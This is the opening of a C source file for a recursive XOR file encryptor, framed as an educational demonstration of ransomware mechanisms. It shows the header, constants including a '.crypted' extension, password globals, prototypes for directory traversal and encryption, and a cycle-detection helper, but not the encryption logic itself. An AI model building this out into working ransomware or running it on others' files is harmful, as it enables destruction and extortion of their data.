/*
 * FileCrypt.c - Simple XOR File Encryption Tool
 * 
 * EDUCATIONAL PURPOSE ONLY - Understanding Ransomware Mechanisms
 * This demonstrates basic file encryption using XOR cipher
 * 
 * WARNING: Use only on test files you own! Always backup first!
 * 
 * Compilation: gcc -o FileCrypt FileCrypt.c
 * 
 * Author: Jack Wizz
 * Date: 2025-09-23
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <getopt.h> // For command-line argument parsing



#define MAX_PATH 4096              // Maximum path length
#define MAX_PASSWORD 256           // Maximum password length
#define BUFFER_SIZE 8192           // Buffer size for file operations
#define ENCRYPTED_EXT ".crypted"   // Extension for encrypted files
#define MAX_RECURSION_DEPTH 100    // Maximum recursion depth for find_files_recursive


//global variables
char g_password[MAX_PASSWORD];
int g_password_len = 0;
int g_file_count = 0;

//function signatures
void print_usage(const char* program_name);
void print_banner(void);
int find_files_recursive_safe(const char* directory, int encrypt_mode, int depth); 
int find_files_recursive(const char* directory, int encrypt_mode); //wrapper
int xor_encrypt_file(const char* filepath);
int xor_decrypt_file(const char* filepath);
void xor_cipher(unsigned char* data, int data_len, const char* key, int key_len);
int is_target_file(const char* filepath, int encrypt_mode);


//struct for track visited directories to avoid cycles
typedef struct {
    dev_t device;
    ino_t inode;
} path_id_t;

//static array to hold visited paths
static path_id_t visited_paths[1000];
static int visited_count = 0;


int is_already_visited(const char* path) {
    struct stat st;
    if (stat(path, &st) != 0) return 0;
    
    path_id_t current = {st.st_dev, st.st_ino};
    
    for (int i = 0; i < visited_count; i++) {
        if (visited_paths[i].device == current.device && visited_paths[i].inode == current.inode) {
            return 1;  // Already visited this directory
        }
    }
    
    // Add to visited list
    if (visited_count < 1000) {
        visited_paths[visited_count++] = current;
    }
    
    return 0;
}
